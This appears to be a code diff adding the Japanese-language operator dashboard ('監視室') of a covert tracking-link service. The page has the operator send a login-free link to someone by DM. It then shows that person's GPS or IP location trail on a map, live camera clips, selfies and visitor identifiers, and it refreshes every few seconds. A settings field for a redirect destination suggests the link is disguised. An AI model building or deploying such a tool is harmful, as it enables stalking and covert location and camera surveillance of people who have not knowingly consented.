@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{ link.name }} — 監視室</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;padding:14px}
+h1{font-size:18px;margin:0 0 6px}
+h3{font-size:14px;margin:18px 0 6px;color:#c7cddb}
+.dim{color:#8b93a7;font-size:12px}
+.mono{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#8b93a7}
+.card{background:#171a21;border:1px solid #262b36;border-radius:10px;padding:12px;margin:8px 0}
+#share{border-color:#4c8dff}
+#share.new{box-shadow:0 0 0 2px rgba(76,141,255,.25)}
+#share input{width:100%;box-sizing:border-box;padding:9px 10px;background:#11141a;color:#e6e9ef;
+  border:1px solid #262b36;border-radius:8px;font-size:13px;font-family:ui-monospace,Menlo,monospace}
+.row{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px;align-items:center}
+a.btn,button{padding:7px 13px;border-radius:8px;background:#2b3346;color:#e6e9ef;
+  text-decoration:none;font-size:12px;border:1px solid #39415a;cursor:pointer}
+a.go{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:8px;margin:10px 0}
+.grid .card{margin:0;padding:10px}
+.k{font-size:11px;color:#8b93a7}
+.v{font-size:16px;font-weight:700;margin-top:2px}
+.v.gps{color:#7ee08a}.v.ip{color:#f0b429}
+.live{color:#7ee08a;font-weight:700;font-size:12px}
+.off{color:#8b93a7;font-size:12px}
+#map{height:380px;border-radius:10px;overflow:hidden;border:1px solid #262b36}
+body.hidemap #map{display:none}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{text-align:left;padding:4px 6px;border-bottom:1px solid #232734}
+#cam,#selfie{width:100%;max-width:360px;border-radius:10px;background:#000;display:block;margin:8px 0}
+.warn{color:#f0b429;font-size:12px}
+.ok{color:#7ee08a;font-size:12px;font-weight:700}
+form.inline{display:inline;margin:0}
+select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;color:#e6e9ef;
+  border:1px solid #262b36;border-radius:6px}
+</style></head><body>
+
+<h1>{{ link.name }} <span class="mono">{{ code }}</span>
+  {% if live %}<span class="live">● リアルタイム中</span>{% else %}<span class="off">○ 待機</span>{% endif %}</h1>
+<div class="dim">{{ mode_label }} / {{ link.interval }}秒間隔 /
+  {{ '有効' if link.active else '停止中' }} / 全体 {{ total }}点</div>
+
+<div class="card" id="share">
+  <div class="dim">相手に送るURL（これをDMで送る）— ログイン不要で開けます</div>
+  <input id="shareurl" readonly value="{{ share }}" onclick="this.select()">
+  <div class="row">
+    <button class="go" id="sharecopy" type="button">このURLをコピー</button>
+    <a class="btn go" href="{{ share }}" target="_blank">開いて確認</a>
+    <a class="btn" href="{{ base }}/gp">一覧</a>
+  </div>
+  {% if is_new %}<div class="ok">✓ 作成しました。上のURLを相手に送ってください。</div>{% endif %}
+  <div class="warn" style="margin-top:8px">この監視室のURLは {{ watch_url }}。要ログインなので、
+    そのまま送ると相手はログイン画面になります。</div>
+</div>
+
+<div class="row">
+  <button id="bshow" type="button">🟢 追跡を表示</button>
+  <button id="bhide" type="button">⚪ 追跡を隠す</button>
+  <a class="btn" href="{{ share }}" target="_blank">開く</a>
+</div>
+
+<div class="grid">
+  <div class="card"><div class="k">最後の位置</div><div class="v" id="vlast">-</div>
+    <div class="k" id="vsub"></div></div>
+  <div class="card"><div class="k">取得元</div><div class="v" id="vsrc">-</div></div>
+  <div class="card"><div class="k">最終通信</div><div class="v" id="vts">-</div></div>
+  <div class="card"><div class="k">点数</div><div class="v" id="vn">{{ total }}</div></div>
+</div>
+<div class="dim" id="warn"></div>
+
+<div id="map"></div>
+
+{% if link.mode == 'live' %}
+<h3>リアルタイム映像（20秒ずつ）</h3>
+<video id="cam" controls playsinline></video>
+<div class="row">
+  <button id="playall" type="button">▶ 最初から順に再生</button>
+  <button id="playlast" type="button">⏭ 最新へ</button>
+  <a class="btn" id="openall" href="#" target="_blank">30分ぶんを開く</a>
+</div>
+<div class="dim" id="recinfo"></div>
+<h3>自撮り</h3>
+<img id="selfie" alt="">
+<div class="dim" id="selfieinfo">まだありません</div>
+{% endif %}
+
+<h3>最近の点（新しい順 300件）</h3>
+<table><tr><th>時刻</th><th>位置</th><th>精度</th><th>取得元</th><th>場所</th><th>識別者</th></tr>
+<tbody id="ptable"></tbody></table>
+
+<h3>識別者コード</h3>
+<div class="card">
+  {% for v, n in vids.items() %}<span class="mono">{{ v[:8] }}（{{ n }}点） </span>{% endfor %}
+  {% if not vids %}<span class="dim">まだ点がありません。</span>{% endif %}
+</div>
+
+<h3>設定</h3>
+<form method="post" action="/gp/{{ code }}/update" class="card">
+  <label>名前 <input type="text" name="name" value="{{ link.name }}"></label>
+  <label>モード
+    <select name="mode">
+      {% for m in ["geo","snap","live"] %}
+      <option value="{{ m }}" {% if link.mode == m %}selected{% endif %}>{{ m }}</option>
+      {% endfor %}
+    </select></label>
+  <label>間隔(秒) <input type="number" name="interval" value="{{ link.interval or 15 }}" min="5" max="600"></label>
+  <label>飛び先 <input type="text" name="dest" value="{{ link.dest or '' }}" placeholder="https://..."></label>
+  <label>メモ <input type="text" name="note" value="{{ link.note or '' }}"></label>
+  <label>状態
+    <select name="active">
+      <option value="1" {% if link.active %}selected{% endif %}>有効</option>
+      <option value="0" {% if not link.active %}selected{% endif %}>停止中</option>
+    </select></label>
+  <button type="submit">保存</button>
+</form>
+<div class="row">
+  <form class="inline" method="post" action="/gp/{{ code }}/clear"
+        onsubmit="return confirm('点を消しますか？')"><button type="submit">点を消す</button></form>
+  <form class="inline" method="post" action="/gp/{{ code }}/delete"
+        onsubmit="return confirm('削除しますか？')"><button type="submit">削除</button></form>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+(function () {
+  var CODE = {{ code|tojson }};
+  var pts = {{ pts|tojson }};
+  var lastId = 0;
+  pts.forEach(function (p) { if (p.id > lastId) lastId = p.id; });
+
+  document.getElementById('sharecopy').addEventListener('click', function () {
+    var b = this, u = document.getElementById('shareurl').value;
+    function done() { b.textContent = 'コピーしました'; setTimeout(function () { b.textContent = 'このURLをコピー'; }, 1500); }
+    function fb() {
+      try { var t = document.createElement('textarea'); t.value = u;
+            t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
+            t.select(); document.execCommand('copy'); t.remove(); done(); } catch (e) {}
+    }
+    try { navigator.clipboard && navigator.clipboard.writeText
+            ? navigator.clipboard.writeText(u).then(done).catch(fb) : fb(); } catch (e) { fb(); }
+  });
+
+  var map = L.map('map').setView([36.2, 138.2], 5);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
+    { maxZoom: 19, attribution: 'OSM' }).addTo(map);
+  var line = null, mark = null, trail = L.layerGroup().addTo(map), gm = L.layerGroup().addTo(map);
+
+  function drawAll() {
+    trail.clearLayers(); gm.clearLayers();
+    var ll = pts.filter(function (p) { return p.lat != null; }).map(function (p) { return [p.lat, p.lon]; });
+    if (!ll.length) return;
+    line = L.polyline(ll, { color: '#4c8dff', weight: 3, opacity: .8 }).addTo(trail);
+    var lp = ll[ll.length - 1];
+    mark = L.circleMarker(lp, { radius: 7, color: '#7ee08a', weight: 3,
+      fillColor: '#7ee08a', fillOpacity: .5 }).addTo(gm).bindPopup('最後の位置');
+    if (ll.length > 1) map.fitBounds(line.getBounds(), { padding: [30, 30] });
+    else map.setView(lp, 15);
+  }
+  function addPt(p) {
+    if (p.lat == null) return;
+    var lp = [p.lat, p.lon];
+    if (line) line.addLatLng(lp); else { drawAll(); return; }
+    if (mark) mark.setLatLng(lp);
+    map.panInside(lp, { padding: [40, 40] });
+  }
+  drawAll();
+
+  function table() {
+    var h = '';
+    pts.slice(-300).reverse().forEach(function (p) {
+      h += '<tr><td class="mono">' + (p.ts || '').slice(5, 19) + '</td><td class="mono">' +
+        (p.lat != null ? (+p.lat).toFixed(5) + ', ' + (+p.lon).toFixed(5) : '-') + '</td><td>' +
+        (p.acc ? '±' + Math.round(p.acc) + 'm' : '-') + '</td><td>' +
+        (p.src === 'gps' ? 'GPS' : '回線推定') + '</td><td>' + (p.city || '') + '</td><td class="mono">' +
+        (p.vid || '').slice(0, 8) + '</td></tr>';
+    });
+    document.getElementById('ptable').innerHTML = h;
+  }
+  table();
+
+  var lastSelfie = '';
+  function poll() {
+    fetch('/api/gp/' + encodeURIComponent(CODE) + '?since=' + lastId, { cache: 'no-store' })
+      .then(function (r) { return r.json(); })
+      .then(function (j) {
+        if (!j) return;
+        (j.points || []).forEach(function (p) { if (p.id > lastId) { lastId = p.id; pts.push(p); addPt(p); } });
+        table();
+        var L0 = j.last || {};
+        var el = document.getElementById('vlast');
+        if (L0.lat != null) {
+          el.textContent = (+L0.lat).toFixed(5) + ', ' + (+L0.lon).toFixed(5);
+          el.className = 'v ' + (L0.src === 'ip' ? 'ip' : 'gps');
+        } else { el.textContent = '-'; el.className = 'v'; }
+        document.getElementById('vsub').textContent =
+          (L0.city || '') + (L0.acc ? ' ±' + Math.round(L0.acc) + 'm' : '');
+        var s = document.getElementById('vsrc');
+        s.textContent = L0.src === 'gps' ? 'GPS' : (L0.src === 'ip' ? '回線推定' : '-');
+        s.className = 'v ' + (L0.src === 'gps' ? 'gps' : 'ip');
+        document.getElementById('vts').textContent = (L0.ts || '').slice(11, 19) || '-';
+        document.getElementById('vn').textContent = j.count || 0;
+        document.getElementById('warn').textContent =
+          j.mode !== 'gps' && (j.last || {}).src === 'ip'
+            ? '一部または全部がIP推定の位置です。4G/5G回線では数km〜数十kmの誤差が出ます（GPSを許可していれば精度が上がります）' : '';
+        if (j.selfie && j.selfie !== lastSelfie) {
+          lastSelfie = j.selfie;
+          var im = document.getElementById('selfie');
+          if (im) { im.src = j.selfie; }
+          var si = document.getElementById('selfieinfo');
+          if (si) si.textContent = (j.selfie_ts || '').slice(5, 19);
+        }
+      }).catch(function () {});
+  }
+  setInterval(poll, 4000);
+  poll();
+
+  {% if link.mode == 'live' %}
+  var recEl = document.getElementById('cam'), list = [], idx = 0, curSid = '';
+  function loadList() {
+    fetch('/g/' + encodeURIComponent(CODE) + '/v.json', { cache: 'no-store' })
+      .then(function (r) { return r.json(); })
+      .then(function (j) {
+        var f = (j.files || []).filter(function (x) { return x.seq > 0 || true; });
+        list = f;
+        document.getElementById('recinfo').textContent =
+          f.length ? f.length + '本 / 最大 ' + j.keep_min + '分ぶん' : '録画はまだありません';
+        var oa = document.getElementById('openall');
+        if (oa && f.length) oa.href = f[f.length - 1].url;
+      }).catch(function () {});
+  }
+  function playAt(i) {
+    if (!list.length || !recEl) return;
+    idx = Math.max(0, Math.min(i, list.length - 1));
+    recEl.src = list[idx].url;
+    var p = recEl.play(); if (p && p.catch) p.catch(function () {});
+  }
+  if (recEl) recEl.addEventListener('ended', function () { if (idx + 1 < list.length) playAt(idx + 1); });
+  document.getElementById('playall').addEventListener('click', function () { playAt(0); });
+  document.getElementById('playlast').addEventListener('click', function () { playAt(list.length - 1); });
+  loadList(); setInterval(loadList, 15000);
+  {% endif %}
+
+  var KEY = 'gps_hidemap_' + CODE;
+  function setMode(h) {
+    document.body.classList.toggle('hidemap', h);
+    try { localStorage.setItem(KEY, h ? 'hide' : 'show'); } catch (e) {}
+    if (!h) setTimeout(function () { try { map.invalidateSize(); } catch (e) {} }, 60);
+  }
+  document.getElementById('bshow').addEventListener('click', function () { setMode(false); });
+  document.getElementById('bhide').addEventListener('click', function () { setMode(true); });
+  try { if (localStorage.getItem(KEY) === 'hide') setMode(true); } catch (e) {}
+})();
+</script>
+</body></html>
